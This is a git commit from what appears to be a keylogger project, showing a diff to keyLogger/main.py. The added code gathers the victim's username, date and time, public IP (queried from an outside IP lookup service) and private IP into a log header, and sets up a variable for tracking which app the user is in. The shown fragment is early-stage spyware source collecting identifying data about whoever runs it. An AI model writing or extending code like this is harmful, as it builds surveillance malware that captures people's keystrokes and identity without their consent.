1de084930f42f0ceae4e311312eb1b83bd3ad4ac
manishfsb <mnshbsnt@gmail.com>
2020-11-17 22:20:50 -0500

    appending the obtained information to an array and also initializing some variables to compare some apps that the user might have used

--- keyLogger/main.py
+++ keyLogger/main.py
@@ -9,7 +9,11 @@ user = os.path.expanduser('~').split('\\')[2]
 publicIP = requests.get('https://api.ipify.org/').text
 privateIP = socket.gethostbyname(socket.gethostname())
 
-print(datetime)
-print(user)
-print(publicIP)
-print(privateIP)
+msg = f'[START OF LOGS]\n  *~ Date/Time: {datetime}\n  *~ User-Profile: {user}\n  *~ Public-IP: {publicIP}\n  *~ Private-IP: {privateIP}\n\n'
+logged_data = []
+logged_data.append(msg)
+
+old_app = ''
+
+
+
